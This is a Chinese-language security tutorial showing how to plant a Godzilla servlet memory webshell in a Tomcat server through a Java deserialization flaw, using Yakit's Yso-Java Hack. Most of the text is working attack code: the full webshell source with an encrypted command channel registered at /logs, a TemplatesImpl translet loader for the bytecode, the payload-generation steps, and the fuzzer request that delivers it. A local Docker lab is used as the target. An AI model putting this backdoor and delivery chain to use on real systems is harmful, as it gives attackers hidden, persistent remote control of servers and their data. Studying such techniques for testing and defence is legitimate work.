# 背景

对于反序列化漏洞利用，一般命令执行后可以直接反弹shell或上线cs，但不出网的情况下想获取目标机器的信息，或进一步利用，就需要用到内存马配合shell管理工具了。

 **Yso-Java Hack 功能上了有一段时间了** ，可能有些师傅还不太熟悉，其实使用起来很方便，本篇文章介绍下如何利用反序列化漏洞直接打入内存马。

# 生成内存马

现在Yakit暂时还没有 shell 管理功能，所以就选用哥斯拉做 shell 管理工具。针对哥斯拉的马进行改造，改成servlet内存马。

我用的哥斯拉版本是4.0.1，生成的是jsp马，改成内存马就像下面这样。

`import org.apache.catalina.core.StandardContext; import
javax.servlet.Servlet; import javax.servlet.ServletException; import
javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest; import
javax.servlet.http.HttpServletResponse; import java.io.IOException; import
java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader;
public class GodzillaMem extends HttpServlet { String xc = "3c6e0b8a9c15224a";
String pass = "pass"; static String pattern = "/logs"; static String
servletName = "JVMService"; String md5 = md5(pass + xc); Class payload; static
{ Servlet servlet = new GodzillaMem();
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase
=(org.apache.catalina.loader.WebappClassLoaderBase)
Thread.currentThread().getContextClassLoader(); StandardContext standardCtx =
(StandardContext)webappClassLoaderBase.getResources().getContext();
org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
newWrapper.setName(servletName); newWrapper.setLoadOnStartup(1);
newWrapper.setServlet(servlet);
newWrapper.setServletClass(servlet.getClass().getName());
standardCtx.addChild(newWrapper);
standardCtx.addServletMappingDecoded(pattern,servletName); } public static
String md5(String s) { String ret = null; try { java.security.MessageDigest m;
m = java.security.MessageDigest.getInstance("MD5"); m.update(s.getBytes(), 0,
s.length()); ret = new java.math.BigInteger(1,
m.digest()).toString(16).toUpperCase(); } catch (Exception e) { } return ret;
} public static String base64Encode(byte[] bs) throws Exception { Class
base64; String value = null; try { base64 = Class.forName("java.util.Base64");
Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
value = (String) Encoder.getClass().getMethod("encodeToString", new
Class[]{byte[].class}).invoke(Encoder, new Object[]{bs}); } catch (Exception
e) { try { base64 = Class.forName("sun.misc.BASE64Encoder"); Object Encoder =
base64.newInstance(); value = (String) Encoder.getClass().getMethod("encode",
new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs}); } catch
(Exception e2) { } } return value; } public static byte[] base64Decode(String
bs) throws Exception { Class base64; byte[] value = null; try { base64 =
Class.forName("java.util.Base64"); Object decoder =
base64.getMethod("getDecoder", null).invoke(base64, null); value = (byte[])
decoder.getClass().getMethod("decode", new
Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception
e) { try { base64 = Class.forName("sun.misc.BASE64Decoder"); Object decoder =
base64.newInstance(); value = (byte[])
decoder.getClass().getMethod("decodeBuffer", new
Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception
e2) { } } return value; } public byte[] x(byte[] s, boolean m) { try {
javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES"); c.init(m ? 1 :
2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES")); return
c.doFinal(s); } catch (Exception e) { return null; } } public Class
defClass(byte[] classBytes) throws Throwable { URLClassLoader urlClassLoader =
new URLClassLoader(new URL[0],
Thread.currentThread().getContextClassLoader()); Method defMethod =
ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class,
int.class); defMethod.setAccessible(true); return (Class)
defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length); }
@Override protected void doPost(HttpServletRequest req, HttpServletResponse
resp) throws ServletException, IOException { try { byte[] data =
base64Decode(req.getParameter(pass)); data = x(data, false); if (payload ==
null) { payload = defClass(data); } else { java.io.ByteArrayOutputStream
arrOut = new java.io.ByteArrayOutputStream(); Object f =
payload.newInstance(); f.equals(arrOut); f.equals(data); f.equals(req);
resp.getWriter().write(md5.substring(0, 16)); f.toString();
resp.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
resp.getWriter().write(md5.substring(16)); } } catch (Throwable e) { } } }`

``

这是一个基础的servlet马，其它的马也是一样的原理。

# 生成payload

上面改造的 servlet 内存马想通过反序列化链利用还需要进行一些改造。代码执行是通过 TemplatesImpl
对象反序列化时加载类导致的，它在加载类时，只会实例化继承自 AbstractTranslet 的类。

![](https://image.3001.net/images/20221230/1672371742_63ae5e1ef15b8ef2a133d.png!small)

而我们构造的内存马是继承自 HttpServlet ，Java只支持单继承。所以我们可以再写一个继承自 AbstractTranslet
的类来加载内存马。如下，将 base64Class 的值改为上面内存马的base64编码。

`package payload; import com.sun.org.apache.xalan.internal.xsltc.DOM; import
com.sun.org.apache.xalan.internal.xsltc.TransletException; import
com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import
com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import
com.sun.org.apache.xml.internal.serializer.SerializationHandler; import
java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader;
import java.util.Base64; public class LoadBytesCode extends AbstractTranslet {
static String base64Class = "<字节码的base64编码>"; static { byte[] bytes =
Base64.getDecoder().decode(base64Class); try {
defClass(bytes).getConstructor().newInstance(); } catch (Throwable e) {
e.printStackTrace(); } } public static Class defClass(byte[] classBytes)
throws Throwable { URLClassLoader urlClassLoader = new URLClassLoader(new
URL[0], Thread.currentThread().getContextClassLoader()); Method defMethod =
ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class,
int.class); defMethod.setAccessible(true); return (Class)
defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length); }
@Override public void transform(DOM document, SerializationHandler[] handlers)
throws TransletException { } @Override public void transform(DOM document,
DTMAxisIterator iterator, SerializationHandler handler) throws
TransletException { } }`

``

编译 LoadBytesCode 类生成 class 后再 base64 编码，在 Yso-Java Hack 功能里选择链，恶意类选择
FromBytes，填入字节码，生成hex格式数据。

![](https://image.3001.net/images/20221230/1672371752_63ae5e28862c29cf52b43.png!small)

# 实战演练

先在本地搭建一个测试环境，源码如下：

![](https://image.3001.net/images/20221230/1672371762_63ae5e32155251a7dc6fb.png!small)

这里已经给需要测试的师傅打包好了docker环境，docker运行下就可以:`docker run -p 8080:8080 -itd
--name="deserilize_test" z3r0ne0/deserilize_test`

启动环境后，使用 Web Fuzzer 发送 payload

` **GET** / HTTP/1.1 **Host:** localhost:8080 _**{{hexdec(
<之前复制的payload>)}}**_`

``

访问 http://localhost:8080/logs 发现405错误，而不是404，说明注册servlet成功了

![](https://image.3001.net/images/20221230/1672371771_63ae5e3b47940ba902d4e.png!small)

使用哥斯拉连接成功

![](https://image.3001.net/images/20221230/1672371783_63ae5e4705048372cd00d.png!small)

# 总结

Yso-Java Hack 帮我们完成了很多需要代码操作的事情，而且支持自定义恶意类，可扩展性还是很强的，希望本篇文章可以给师傅们一些新思路，提高工作效率。

# 参考文章

https://paper.seebug.org/1885/

